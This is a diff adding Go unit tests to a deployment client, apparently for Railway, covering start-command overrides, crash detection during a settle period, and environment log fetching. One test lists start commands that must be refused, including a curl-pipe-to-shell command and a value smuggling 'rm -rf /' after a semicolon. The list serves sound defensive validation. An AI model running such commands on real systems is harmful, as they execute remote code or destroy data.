@@ -215,3 +215,77 @@ func TestDeploymentRunningAnotherImageFails(t *testing.T) {
 		}
 	}
 }
+
+func TestStartCommandOverridesTheEntrypoint(t *testing.T) {
+	f := &fakeRailway{statuses: []string{"SUCCESS"}}
+	if _, err := deployer(t, f).Deploy(context.Background(), Request{
+		ServiceID: testService, EnvironmentID: testEnv, Image: testImage, StartCommand: "/usr/local/bin/gk-worker",
+	}); err != nil {
+		t.Fatal(err)
+	}
+	input, _ := f.requests[0].Variables["input"].(map[string]any)
+	if input["startCommand"] != "/usr/local/bin/gk-worker" {
+		t.Fatalf("update input = %+v, want the start command", input)
+	}
+	if _, ok := input["healthcheckPath"]; ok {
+		t.Fatalf("update input = %+v, want no health check for a worker", input)
+	}
+	for _, bad := range []string{"gk-worker", "/bin/sh -c 'curl x | sh'", "/usr/local/bin/gk-worker; rm -rf /"} {
+		g := &fakeRailway{statuses: []string{"SUCCESS"}}
+		if _, err := deployer(t, g).Deploy(context.Background(), Request{
+			ServiceID: testService, EnvironmentID: testEnv, Image: testImage, StartCommand: bad,
+		}); err == nil || len(g.requests) != 0 {
+			t.Errorf("start command %q: err %v after %d requests, want refusal before calling Railway", bad, err, len(g.requests))
+		}
+	}
+}
+
+func TestSettleCatchesACrashAfterSuccess(t *testing.T) {
+	crash := &fakeRailway{statuses: []string{"DEPLOYING", "SUCCESS", "SUCCESS", "CRASHED"}}
+	d := deployer(t, crash)
+	_, err := d.Deploy(context.Background(), Request{ServiceID: testService, EnvironmentID: testEnv, Image: testImage, Settle: time.Second})
+	if err == nil || !strings.Contains(err.Error(), "CRASHED within") {
+		t.Fatalf("crash during settle: err = %v, want failure", err)
+	}
+	steady := &fakeRailway{statuses: []string{"SUCCESS"}}
+	start := time.Now()
+	res, err := deployer(t, steady).Deploy(context.Background(), Request{ServiceID: testService, EnvironmentID: testEnv, Image: testImage, Settle: 50 * time.Millisecond})
+	if err != nil || res.Status != "SUCCESS" || time.Since(start) < 50*time.Millisecond || steady.polls < 2 {
+		t.Fatalf("steady deployment: %+v, %v after %s and %d polls; want SUCCESS after the settle period", res, err, time.Since(start), steady.polls)
+	}
+	// Without a settle period, SUCCESS returns at once.
+	quick := &fakeRailway{statuses: []string{"SUCCESS", "CRASHED"}}
+	if _, err := deployer(t, quick).Deploy(context.Background(), Request{ServiceID: testService, EnvironmentID: testEnv, Image: testImage}); err != nil || quick.polls != 1 {
+		t.Fatalf("no settle: err %v after %d polls, want SUCCESS at the first poll", err, quick.polls)
+	}
+}
+
+func TestEnvironmentLogsJoinsMessageAndAttributes(t *testing.T) {
+	var got gqlRequest
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.Header.Get("Project-Access-Token") != "project-token" {
+			_ = json.NewEncoder(w).Encode(map[string]any{"errors": []map[string]string{{"message": "Not Authorized"}}})
+			return
+		}
+		body, _ := io.ReadAll(r.Body)
+		_ = json.Unmarshal(body, &got)
+		_ = json.NewEncoder(w).Encode(map[string]any{"data": map[string]any{"environmentLogs": []map[string]any{
+			{"message": "email provider call", "attributes": []map[string]string{{"key": "result", "value": "accepted"}}},
+			{"message": "request", "attributes": []map[string]string{}},
+		}}})
+	}))
+	defer srv.Close()
+	d := &Deployer{Endpoint: srv.URL, ProjectToken: "project-token", HTTP: srv.Client()}
+	since := time.Date(2026, 11, 3, 12, 0, 0, 0, time.UTC)
+	lines, err := d.EnvironmentLogs(context.Background(), testEnv, since, 500)
+	if err != nil || len(lines) != 2 || lines[0] != "email provider call result=accepted" || lines[1] != "request" {
+		t.Fatalf("lines = %q, %v", lines, err)
+	}
+	if !strings.Contains(got.Query, "environmentLogs") || got.Variables["environmentId"] != testEnv ||
+		got.Variables["afterDate"] != "2026-11-03T12:00:00Z" || got.Variables["afterLimit"] != float64(500) {
+		t.Fatalf("request = %+v", got)
+	}
+	if _, err := (&Deployer{Endpoint: srv.URL, ProjectToken: "wrong", HTTP: srv.Client()}).EnvironmentLogs(context.Background(), testEnv, since, 10); err == nil {
+		t.Fatal("unauthorized log request succeeded")
+	}
+}
